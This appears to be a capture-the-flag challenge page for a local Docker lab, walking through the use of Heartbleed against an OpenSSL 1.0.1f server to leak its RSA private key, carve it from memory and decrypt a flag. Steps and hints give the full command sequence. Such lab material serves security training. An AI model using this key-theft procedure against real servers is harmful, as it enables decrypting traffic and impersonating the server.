# Level 2 — Steal the server's TLS private key

**Category:** attack · **Points:** 200 · **Target:** `vulnerable` (OpenSSL 1.0.1f, port 4433)

## Scenario
Leaking a password was bad. Leaking the server's **private key** is catastrophic:
with it an attacker can decrypt captured traffic and impersonate the server
entirely. The portal even publishes a secret encrypted *to that key* — safe in
theory, because only the server should ever hold the matching private half.

## Your objective
Recover the vulnerable server's **RSA private key** from leaked memory, then use
it to decrypt the ciphertext the portal publishes at
<http://localhost:8090/flag2.enc>. The decrypted plaintext is the flag.

## What you're given
- `vulnerable` — the same OpenSSL 1.0.1f server. Its TLS private key is kept
  resident in heap, so Heartbleed can leak it (it's a ~1.6 KB PEM, not a short
  string, so you want the raw bytes — not just the hex view).
- `attacker/heartbleedExploit.py --raw` — writes the raw over-read to stdout so
  you can redirect it to a file and carve the key out.
- The portal serves the encrypted flag at `/flag2.enc`.

## A quirk you need to know
The key is leaked from an HTTP request line, which can't contain spaces or
newlines — so in memory the PEM's **newlines show up as `~` and its spaces as
`_`**. You'll see it as `-----BEGIN_PRIVATE_KEY-----~MIIE...~-----END_PRIVATE_KEY-----`.
Convert `~`→newline and `_`→space to rebuild a real key file.

## Steps
```bash
# 1. lab up
docker compose up --build

# 2. download the published ciphertext (encrypted to the server's public key)
curl -s http://localhost:8090/flag2.enc -o flag2.enc

# 3. leak raw memory, then carve the key and undo the ~/_ encoding
docker compose run --rm -T attacker python3 heartbleedExploit.py vulnerable --raw > leak.bin
strings leak.bin \
  | grep -oE '[-]{5}BEGIN_PRIVATE_KEY[-]{5}~[A-Za-z0-9+/=~]+~[-]{5}END_PRIVATE_KEY[-]{5}' \
  | head -1 | tr '~_' '\n ' > key.pem
openssl pkey -in key.pem -noout -check   # "Key is valid" means you carved it right

# 4. decrypt the flag with the stolen key
openssl pkeyutl -decrypt -inkey key.pem -in flag2.enc
```

## Hints
<details><summary>Hint 1</summary>The hex view is for eyeballing short strings. For a multi-line key you want the raw bytes: run the exploit with <code>--raw</code> and redirect to a file, then search that file.</details>
<details><summary>Hint 2</summary>Look for <code>BEGIN_PRIVATE_KEY</code> in the leaked bytes (<code>strings leak.bin | grep PRIVATE</code>). The whole key is on one line because its newlines became <code>~</code> and spaces became <code>_</code>.</details>
<details><summary>Hint 3</summary>Rebuild a usable key by turning the separators back: <code>... | tr '~_' '\n ' > key.pem</code>, then check it with <code>openssl pkey -in key.pem -noout -check</code>.</details>
<details><summary>Hint 4</summary>The ciphertext is RSA. Decrypt with the key you carved: <code>openssl pkeyutl -decrypt -inkey key.pem -in flag2.enc</code>. If your host <code>openssl</code> balks, run the same command inside the attacker container.</details>

## Submitting
```bash
./ctf.sh submit attack-02 'CTF_FLAG{...}'
```
